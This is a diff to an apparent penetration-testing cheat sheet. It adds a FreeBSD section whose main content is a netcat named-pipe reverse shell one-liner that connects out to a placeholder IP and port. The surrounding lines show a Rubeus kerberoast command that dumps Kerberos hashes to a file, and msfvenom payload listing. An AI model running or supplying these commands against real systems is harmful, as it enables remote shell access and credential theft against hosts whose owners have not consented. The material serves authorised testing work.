@@ -304,6 +304,16 @@ If the system has `PsExec.exe` open elevated cmd
 * Documentation `https://github.com/GhostPack/Rubeus`
 * Transfer rubeus.exe on targeted windows machine and run `.\Rubeus.exe kerberoast /outfile:C:\temp\hash.txt` to get a hash
 
+# FreeBSD
+
+### Enumeration
+
+* The path for binaries is  `/usr/local/bin`
+
+### Reverse Shell
+
+`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i |nc <ip> <port> > /tmp/f`
+
 # Msfvenom
 ### List All Payloads
 msfvenom -l payloads
